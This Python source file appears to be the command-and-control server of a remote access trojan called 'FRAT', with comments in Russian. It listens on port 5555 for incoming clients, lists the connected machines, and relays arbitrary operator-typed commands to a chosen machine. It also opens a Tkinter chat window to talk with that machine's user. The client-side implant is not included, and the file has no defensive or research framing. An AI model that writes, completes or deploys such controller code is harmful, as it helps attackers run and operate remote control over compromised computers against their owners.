import socket
import threading
import tkinter as tk
from tkinter import scrolledtext
import os
from colorama import Fore
import ctypes

clients = {}
chat_window = None
chat_text = None
selected_client = None

def logo():
    print(f"{Fore.GREEN}███████╗██████╗░░█████╗░████████╗")
    print(f"{Fore.GREEN}██╔════╝██╔══██╗██╔══██╗╚══██╔══╝")
    print(f"{Fore.GREEN}█████╗░░██████╔╝███████║░░░██║░░░")
    print(f"{Fore.GREEN}██╔══╝░░██╔══██╗██╔══██║░░░██║░░░")
    print(f"{Fore.GREEN}██║░░░░░██║░░██║██║░░██║░░░██║░░░   ")
    print(f"{Fore.GREEN}╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░")
    print(f"{Fore.GREEN}{Fore.RESET}")

def handle_client(client_socket, addr):
    global clients
    clients[addr] = client_socket
    ctypes.windll.kernel32.SetConsoleTitleW(f"FRAT | CONNECTED CLIENTS: {len(clients)}")

    def receive_messages():
        while True:
            try:
                response = client_socket.recv(4096).decode()
                if not response:
                    break
                if chat_window and chat_text and selected_client == addr:
                    chat_text.insert(tk.END, f"[Client {addr[0]}]: {response}\n")
                    chat_text.see(tk.END)
            except (ConnectionResetError, BrokenPipeError):
                break

        print(f"\n{Fore.RED}[!] {Fore.RESET} | Client {addr[0]} disconnected.")
        client_socket.close()
        if addr in clients:
            del clients[addr]

    threading.Thread(target=receive_messages, daemon=True).start()

def accept_clients(server):
    while True:
        try:
            client_socket, addr = server.accept()
            threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()
        except OSError:
            break

def start_server(host="0.0.0.0", port=5555):
    global chat_window, chat_text, selected_client, clients
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")

    accept_thread = threading.Thread(target=accept_clients, args=(server,), daemon=True)
    accept_thread.start()

    os.system("cls")
    logo()
    print(f"[{Fore.YELLOW}?{Fore.RESET}] Waiting for clients to connect...")

    while True:
        if not clients:
            continue

        print("\n[Connected Clients]")
        for idx, addr in enumerate(clients.keys(), start=1):
            print(f"{idx}. {addr[0]}:{addr[1]}")

        choice = input("\nSelect client number (or 'chat' to open chat): ").strip().lower()
        
        if choice == 'chat':
            if not clients:
                print("No clients connected.")
                continue
                
            print("\n[Connected Clients]")
            for idx, addr in enumerate(clients.keys(), start=1):
                print(f"{idx}. {addr[0]}:{addr[1]}")
                
            try:
                client_choice = int(input("\nSelect client for chat: ")) - 1
                if 0 <= client_choice < len(clients):
                    selected_client = list(clients.keys())[client_choice]
                    
                    # Закрываем предыдущее окно чата, если оно есть
                    if chat_window:
                        try:
                            chat_window.destroy()
                        except:
                            pass
                    
                    # Создаем новое окно чата
                    chat_window = tk.Tk()
                    chat_window.title(f"Chat with {selected_client[0]}")
                    chat_window.geometry("500x400")
                    
                    # Текстовое поле чата
                    chat_text = scrolledtext.ScrolledText(chat_window, wrap=tk.WORD, width=60, height=20)
                    chat_text.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
                    
                    # Фрейм для ввода сообщения
                    input_frame = tk.Frame(chat_window)
                    input_frame.pack(padx=10, pady=5, fill=tk.X)
                    
                    entry = tk.Entry(input_frame, width=50)
                    entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
                    
                    def send_message():
                        message = entry.get()
                        if message:
                            chat_text.insert(tk.END, f"[Server]: {message}\n")
                            chat_text.see(tk.END)
                            try:
                                clients[selected_client].send(message.encode())
                            except Exception as e:
                                chat_text.insert(tk.END, f"Error sending message: {str(e)}\n")
                            entry.delete(0, tk.END)
                    
                    send_btn = tk.Button(input_frame, text="Send", command=send_message)
                    send_btn.pack(side=tk.RIGHT, padx=5)
                    entry.bind("<Return>", lambda e: send_message())
                    
                    # Отправляем команду чата клиенту
                    try:
                        clients[selected_client].send("chat".encode())
                    except Exception as e:
                        chat_text.insert(tk.END, f"Error starting chat: {str(e)}\n")
                    
                    # Функция для закрытия окна
                    def on_closing():
                        global chat_window, chat_text, selected_client
                        try:
                            clients[selected_client].send("chat_end".encode())
                        except:
                            pass
                        chat_window.destroy()
                        chat_window = None
                        chat_text = None
                        selected_client = None
                    
                    chat_window.protocol("WM_DELETE_WINDOW", on_closing)
                    
                    # Центрируем окно
                    chat_window.update_idletasks()
                    width = chat_window.winfo_width()
                    height = chat_window.winfo_height()
                    x = (chat_window.winfo_screenwidth() // 2) - (width // 2)
                    y = (chat_window.winfo_screenheight() // 2) - (height // 2)
                    chat_window.geometry(f'+{x}+{y}')
                    
                    # Фокусируемся на поле ввода
                    entry.focus_set()
                    
                    chat_window.mainloop()
                else:
                    print("Invalid client selection")
            except ValueError:
                print("Please enter a valid number")
        
        elif choice.isdigit():
            client_idx = int(choice) - 1
            if 0 <= client_idx < len(clients):
                target = list(clients.keys())[client_idx]
                cmd = input(f"Enter command for {target[0]}: ")
                try:
                    clients[target].send(cmd.encode())
                except Exception as e:
                    print(f"Error sending command: {str(e)}")
            else:
                print("Invalid client number")
        else:
            print("Invalid input")

if __name__ == "__main__":
    start_server()